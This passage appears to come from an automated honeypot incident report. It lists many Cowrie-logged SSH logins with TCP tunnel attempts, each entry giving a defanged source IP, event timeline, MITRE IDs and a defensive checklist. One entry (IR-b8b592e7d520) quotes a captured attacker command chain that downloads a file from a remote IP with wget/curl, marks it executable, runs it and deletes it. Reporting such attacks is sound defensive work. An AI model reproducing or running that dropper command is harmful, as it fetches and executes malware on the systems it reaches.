| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:55:13` | `cowrie.session.connect` |
| `2026-08-20 07:55:14` | `cowrie.client.version` |
| `2026-08-20 07:55:14` | `cowrie.client.kex` |
| `2026-08-20 07:55:19` | `cowrie.login.success` |
| `2026-08-20 07:55:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.45[.]26` to AbuseIPDB if not already reported
- [ ] Block `124.160.45[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-217c9c513bac

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-20 07:55 |
| **Last Seen** | 2026-08-20 07:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:55:27` | `cowrie.session.connect` |
| `2026-08-20 07:55:28` | `cowrie.client.version` |
| `2026-08-20 07:55:28` | `cowrie.client.kex` |
| `2026-08-20 07:55:31` | `cowrie.login.success` |
| `2026-08-20 07:55:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8b592e7d520

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-20 07:57 |
| **Last Seen** | 2026-08-20 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:57:44` | `cowrie.session.connect` |
| `2026-08-20 07:57:44` | `cowrie.telnet.option` |
| `2026-08-20 07:57:44` | `cowrie.login.success` |
| `2026-08-20 07:57:45` | `cowrie.session.params` |
| `2026-08-20 07:57:45` | `cowrie.telnet.option` |
| `2026-08-20 07:57:45` | `cowrie.telnet.option` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.failed` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.success` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.failed` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.success` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.failed` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.success` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.command.failed` |
| `2026-08-20 07:57:45` | `cowrie.command.input` |
| `2026-08-20 07:57:45` | `cowrie.log.closed` |
| `2026-08-20 07:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891dc600b25e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 07:57 |
| **Last Seen** | 2026-08-20 07:58 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:57:58` | `cowrie.session.connect` |
| `2026-08-20 07:57:58` | `cowrie.client.version` |
| `2026-08-20 07:57:58` | `cowrie.client.kex` |
| `2026-08-20 07:58:00` | `cowrie.login.success` |
| `2026-08-20 07:58:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:58:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 07:58:15` | `cowrie.direct-tcpip.data` |
| `2026-08-20 07:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4f6d12f12b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:00 |
| **Last Seen** | 2026-08-20 08:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:00:10` | `cowrie.session.connect` |
| `2026-08-20 08:00:10` | `cowrie.client.version` |
| `2026-08-20 08:00:10` | `cowrie.client.kex` |
| `2026-08-20 08:00:11` | `cowrie.login.success` |
| `2026-08-20 08:00:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:00:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:00:12` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d275b2ae0b49

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-08-20 08:07 |
| **Last Seen** | 2026-08-20 08:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:07:17` | `cowrie.session.connect` |
| `2026-08-20 08:07:18` | `cowrie.client.version` |
| `2026-08-20 08:07:18` | `cowrie.client.kex` |
| `2026-08-20 08:07:18` | `cowrie.login.success` |
| `2026-08-20 08:07:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd41c82704b

| Field | Detail |
|---|---|
| **Source IP** | `62.91.108[.]146` |
| **First Seen** | 2026-08-20 08:07 |
| **Last Seen** | 2026-08-20 08:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:07:24` | `cowrie.session.connect` |
| `2026-08-20 08:07:24` | `cowrie.client.version` |
| `2026-08-20 08:07:24` | `cowrie.client.kex` |
| `2026-08-20 08:07:25` | `cowrie.login.success` |
| `2026-08-20 08:07:25` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.91.108[.]146` to AbuseIPDB if not already reported
- [ ] Block `62.91.108[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b46be0006f5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:08 |
| **Last Seen** | 2026-08-20 08:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:08:30` | `cowrie.session.connect` |
| `2026-08-20 08:08:31` | `cowrie.client.version` |
| `2026-08-20 08:08:31` | `cowrie.client.kex` |
| `2026-08-20 08:08:32` | `cowrie.login.success` |
| `2026-08-20 08:08:33` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:08:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:08:34` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b7d39bdea89

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:10 |
| **Last Seen** | 2026-08-20 08:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:10:51` | `cowrie.session.connect` |
| `2026-08-20 08:10:51` | `cowrie.client.version` |
| `2026-08-20 08:10:51` | `cowrie.client.kex` |
| `2026-08-20 08:10:53` | `cowrie.login.success` |
| `2026-08-20 08:10:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:11:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:11:02` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34a3b8f6a04

| Field | Detail |
|---|---|
| **Source IP** | `81.195.152[.]14` |
| **First Seen** | 2026-08-20 08:10 |
| **Last Seen** | 2026-08-20 08:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:10:58` | `cowrie.session.connect` |
| `2026-08-20 08:10:59` | `cowrie.client.version` |
| `2026-08-20 08:10:59` | `cowrie.client.kex` |
| `2026-08-20 08:11:00` | `cowrie.login.success` |
| `2026-08-20 08:11:01` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.195.152[.]14` to AbuseIPDB if not already reported
- [ ] Block `81.195.152[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8713d42e00c4

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-20 08:11 |
| **Last Seen** | 2026-08-20 08:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:11:06` | `cowrie.session.connect` |
| `2026-08-20 08:11:06` | `cowrie.client.version` |
| `2026-08-20 08:11:06` | `cowrie.client.kex` |
| `2026-08-20 08:11:08` | `cowrie.login.success` |
| `2026-08-20 08:11:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad91e36083e

| Field | Detail |
|---|---|
| **Source IP** | `111.198.53[.]188` |
| **First Seen** | 2026-08-20 08:11 |
| **Last Seen** | 2026-08-20 08:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:11:10` | `cowrie.session.connect` |
| `2026-08-20 08:11:11` | `cowrie.client.version` |
| `2026-08-20 08:11:11` | `cowrie.client.kex` |
| `2026-08-20 08:11:13` | `cowrie.login.success` |
| `2026-08-20 08:11:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.198.53[.]188` to AbuseIPDB if not already reported
- [ ] Block `111.198.53[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069fa2a3bc0b

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-08-20 08:11 |
| **Last Seen** | 2026-08-20 08:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:11:19` | `cowrie.session.connect` |
| `2026-08-20 08:11:20` | `cowrie.client.version` |
| `2026-08-20 08:11:20` | `cowrie.client.kex` |
| `2026-08-20 08:11:23` | `cowrie.login.success` |
| `2026-08-20 08:11:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7de03617aa3

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-08-20 08:12 |
| **Last Seen** | 2026-08-20 08:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:12:33` | `cowrie.session.connect` |
| `2026-08-20 08:12:33` | `cowrie.client.version` |
| `2026-08-20 08:12:33` | `cowrie.client.kex` |
| `2026-08-20 08:12:35` | `cowrie.login.success` |
| `2026-08-20 08:12:35` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d366aebfb30e

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-20 08:12 |
| **Last Seen** | 2026-08-20 08:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:12:41` | `cowrie.session.connect` |
| `2026-08-20 08:12:42` | `cowrie.client.version` |
| `2026-08-20 08:12:42` | `cowrie.client.kex` |
| `2026-08-20 08:12:44` | `cowrie.login.success` |
| `2026-08-20 08:12:45` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61683bcac05

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:19 |
| **Last Seen** | 2026-08-20 08:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:19:15` | `cowrie.session.connect` |
| `2026-08-20 08:19:16` | `cowrie.client.version` |
| `2026-08-20 08:19:16` | `cowrie.client.kex` |
| `2026-08-20 08:19:17` | `cowrie.login.success` |
| `2026-08-20 08:19:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:19:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:19:18` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02847efa8fda

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:21 |
| **Last Seen** | 2026-08-20 08:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:21:48` | `cowrie.session.connect` |
| `2026-08-20 08:21:48` | `cowrie.client.version` |
| `2026-08-20 08:21:48` | `cowrie.client.kex` |
| `2026-08-20 08:21:49` | `cowrie.login.success` |
| `2026-08-20 08:21:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:22:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:22:02` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04605c22d2f7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:29 |
| **Last Seen** | 2026-08-20 08:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:29:52` | `cowrie.session.connect` |
| `2026-08-20 08:29:52` | `cowrie.client.version` |
| `2026-08-20 08:29:53` | `cowrie.client.kex` |
| `2026-08-20 08:29:55` | `cowrie.login.success` |
| `2026-08-20 08:29:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:29:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:29:55` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83f0da4e185

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:32 |
| **Last Seen** | 2026-08-20 08:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:32:45` | `cowrie.session.connect` |
| `2026-08-20 08:32:45` | `cowrie.client.version` |
| `2026-08-20 08:32:45` | `cowrie.client.kex` |
| `2026-08-20 08:32:47` | `cowrie.login.success` |
| `2026-08-20 08:32:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:32:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:32:48` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83610df02466

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-20 08:35 |
| **Last Seen** | 2026-08-20 08:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:35:36` | `cowrie.session.connect` |
| `2026-08-20 08:35:37` | `cowrie.client.version` |
| `2026-08-20 08:35:37` | `cowrie.client.kex` |
| `2026-08-20 08:35:38` | `cowrie.login.success` |
| `2026-08-20 08:35:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21266314fc8e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:40 |
| **Last Seen** | 2026-08-20 08:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:40:34` | `cowrie.session.connect` |
| `2026-08-20 08:40:34` | `cowrie.client.version` |
| `2026-08-20 08:40:34` | `cowrie.client.kex` |
| `2026-08-20 08:40:35` | `cowrie.login.success` |
| `2026-08-20 08:40:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:40:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:40:37` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce03d284714

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-08-20 08:40 |
| **Last Seen** | 2026-08-20 08:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:40:45` | `cowrie.session.connect` |
| `2026-08-20 08:40:46` | `cowrie.client.version` |
| `2026-08-20 08:40:46` | `cowrie.client.kex` |
| `2026-08-20 08:40:47` | `cowrie.login.success` |
| `2026-08-20 08:40:47` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53dfbcce4666

| Field | Detail |
|---|---|
| **Source IP** | `222.99.52[.]202` |
| **First Seen** | 2026-08-20 08:40 |
| **Last Seen** | 2026-08-20 08:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:40:52` | `cowrie.session.connect` |
| `2026-08-20 08:40:53` | `cowrie.client.version` |
| `2026-08-20 08:40:53` | `cowrie.client.kex` |
| `2026-08-20 08:40:56` | `cowrie.login.success` |
| `2026-08-20 08:40:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.52[.]202` to AbuseIPDB if not already reported
- [ ] Block `222.99.52[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

